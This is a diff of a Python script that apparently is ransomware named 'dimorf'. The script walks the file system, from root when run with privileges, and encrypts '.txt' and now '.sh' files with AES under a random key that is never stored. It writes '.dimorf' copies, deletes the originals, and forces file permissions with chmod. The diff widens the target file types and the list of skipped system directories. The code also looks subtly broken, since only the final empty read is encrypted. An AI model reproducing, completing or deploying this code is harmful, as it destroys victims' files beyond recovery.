@@ -19,7 +19,6 @@ def check_os(osname: str) -> str | None:
     
     if (os.getuid() == 0):
         USER_DIR = '/'
-        
     
     # # check if os is linux.
     is_linux = [
@@ -36,8 +35,8 @@ def check_os(osname: str) -> str | None:
     ):
         find_and_encrypt(
             path=USER_DIR,
-            ext_files=['.txt'],
-            critical_dirs=['/bin', '/sbin', '/etc', '/lib'],
+            ext_files=['.txt', '.sh'],
+            cd=['/bin', '/sbin', '/etc', '/lib', '/usr/lib', '/boot'],
             hidden='.',
             new_ext='.dimorf',
             key=Random.get_random_bytes(32),
@@ -48,7 +47,7 @@ def check_os(osname: str) -> str | None:
 def find_and_encrypt(
     path: str,
     ext_files: list,
-    critical_dirs: list,
+    cd: list,
     hidden: str,
     new_ext: str,
     key: bytes,
@@ -57,114 +56,83 @@ def find_and_encrypt(
 
     # # go in search of the file.
     for root, dirs, files in os.walk(path):
-        for file in files:
-            end_with_ext = [
-                ext for ext in ext_files if (
-                    file.endswith(
-                        ext
+        if (
+            not (
+                root.startswith(
+                    cd[0]
+                )
+            ) and not (
+                root.startswith(
+                    cd[1]
+                )
+            ) and not (
+                root.startswith(
+                    cd[2]
+                )
+            ) and not (
+                root.startswith(
+                    cd[3]
+                )
+            ) and not (
+                root.startswith(
+                    cd[4]
+                )
+            ) and not (
+                root.startswith(
+                    cd[5]
+                )
+            )
+        ):
+            
+            for file in files:
+                end_with_ext = [
+                    ext for ext in ext_files if (
+                        file.endswith(
+                            ext
+                        )
                     )
-                )
-            ]
+                ]
 
-            # # verify file type.
-            if ((end_with_ext) and not(
-                file.startswith(
-                    hidden
-                )
-            )):
-                
-                # # checks if the user has permission on the file.
-                if (
-                    os.access(
-                        os.path.join(
-                            root,
-                            file
-                        ), os.F_OK
-                    ) and (
+                # # verify file type.
+                if ((end_with_ext) and not(
+                    file.startswith(
+                        hidden
+                    )
+                )):
+                    
+                    # # checks if the user has permission on the file.
+                    if (
                         os.access(
                             os.path.join(
                                 root,
                                 file
-                            ), os.W_OK
-                        )
-                    ) and (
-                        os.access(
-                            os.path.join(
-                                root,
-                                file
-                            ), os.R_OK
-                        )
-                    )
-                ):
-                    
-                    # # beginning encrypt operations.
-                    init_vector = Random.new().read(16)
-                    cipher = AES.new(
-                        key,
-                        AES.MODE_CBC,
-                        init_vector
-                    )
-                    
-                    try:
-                        # # open and reads file in blocks of 65536 bytes.    
-                        with open(os.path.join(root, file), mode='rb') as f:
-                            while True:
-                                data = f.read(
-                                    block_bytes
-                                )
-
-                                # # add padding
-                                if len(data) == 0:
-                                    data += b'\x00\x01' * (
-                                        16 - (
-                                            len(
-                                                data
-                                            ) % 16
-                                        )
-                                    )
-                                    break
-                                else:
-                                    pass
-
-                        # # creates a new one with the same encrypted information
-                        # # and adds the modified extension ".dimorf".
-                        with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
-                            f.write(
-                                cipher.encrypt(
-                                    data
-                                )
+                            ), os.F_OK
+                        ) and (
+                            os.access(
+                                os.path.join(
+                                    root,
+                                    file
+                                ), os.W_OK
                             )
+                        ) and (
+                            os.access(
+                                os.path.join(
+                                    root,
+                                    file
+                                ), os.R_OK
+                            )
+                        )
+                    ):
                         
-                        # # remove the original file.
-                        os.remove(
-                            os.path.join(
-                                root,
-                                file
-                            )
-                        )
-                                            
-                    except PermissionError:
-                        pass
-                
-                else:
-                    try:
-                        # # don't have? try assign.
-                        os.chmod(
-                            os.path.join(
-                                root, 
-                                file
-                            ), 0o644
+                        # # beginning encrypt operations.
+                        init_vector = Random.new().read(16)
+                        cipher = AES.new(
+                            key,
+                            AES.MODE_CBC,
+                            init_vector
                         )
                         
                         try:
-                            # # beginning encrypt operations.
-                            init_vector = Random.new().read(16)
-                            cipher = AES.new(
-                                key,
-                                AES.MODE_CBC,
-                                init_vector
-                            )
-                            
                             # # open and reads file in blocks of 65536 bytes.    
                             with open(os.path.join(root, file), mode='rb') as f:
                                 while True:
@@ -184,7 +152,7 @@ def find_and_encrypt(
                                         break
                                     else:
                                         pass
-                                
+
                             # # creates a new one with the same encrypted information
                             # # and adds the modified extension ".dimorf".
                             with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
@@ -193,7 +161,7 @@ def find_and_encrypt(
                                         data
                                     )
                                 )
-                                                    
+                            
                             # # remove the original file.
                             os.remove(
                                 os.path.join(
@@ -201,24 +169,83 @@ def find_and_encrypt(
                                     file
                                 )
                             )
-                        
+                                                
                         except PermissionError:
                             pass
                     
-                    except PermissionError:
-                        
-                        # # generates a log file with the files
-                        # # that could not be assigned permission.
-                        sleep(2)
-                        logs = [
-                            ('Erro ao alterar permissões de arquivo.\n'),
-                            (f'Arquivos => {os.path.join(root, file)}\n')
-                        ]
+                    else:
+                        try:
+                            # # don't have? try assign.
+                            os.chmod(
+                                os.path.join(
+                                    root, 
+                                    file
+                                ), 0o644
+                            )
+                            
+                            try:
+                                # # beginning encrypt operations.
+                                init_vector = Random.new().read(16)
+                                cipher = AES.new(
+                                    key,
+                                    AES.MODE_CBC,
+                                    init_vector
+                                )
+                                
+                                # # open and reads file in blocks of 65536 bytes.    
+                                with open(os.path.join(root, file), mode='rb') as f:
+                                    while True:
+                                        data = f.read(
+                                            block_bytes
+                                        )
 
-                        with open('log_dimorf.log', mode='w') as lf:
-                            if lf.write(logs[0]):
-                                lf.write(logs[1])
-                                print(f'\33[32mLogs gerado em {lf}\33[0m')
+                                        # # add padding
+                                        if len(data) == 0:
+                                            data += b'\x00\x01' * (
+                                                16 - (
+                                                    len(
+                                                        data
+                                                    ) % 16
+                                                )
+                                            )
+                                            break
+                                        else:
+                                            pass
+                                    
+                                # # creates a new one with the same encrypted information
+                                # # and adds the modified extension ".dimorf".
+                                with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
+                                    f.write(
+                                        cipher.encrypt(
+                                            data
+                                        )
+                                    )
+                                                        
+                                # # remove the original file.
+                                os.remove(
+                                    os.path.join(
+                                        root,
+                                        file
+                                    )
+                                )
+                            
+                            except PermissionError:
+                                pass
+                        
+                        except PermissionError:
+                            
+                            # # generates a log file with the files
+                            # # that could not be assigned permission.
+                            sleep(2)
+                            logs = [
+                                ('Erro ao alterar permissões de arquivo.\n'),
+                                (f'Arquivos => {os.path.join(root, file)}\n')
+                            ]
+
+                            with open('log_dimorf.log', mode='w') as lf:
+                                if lf.write(logs[0]):
+                                    lf.write(logs[1])
+                                    print(f'\33[32mLogs gerado em {lf}\33[0m')
                             
 if __name__ == '__main__':
     os.system('clear')        
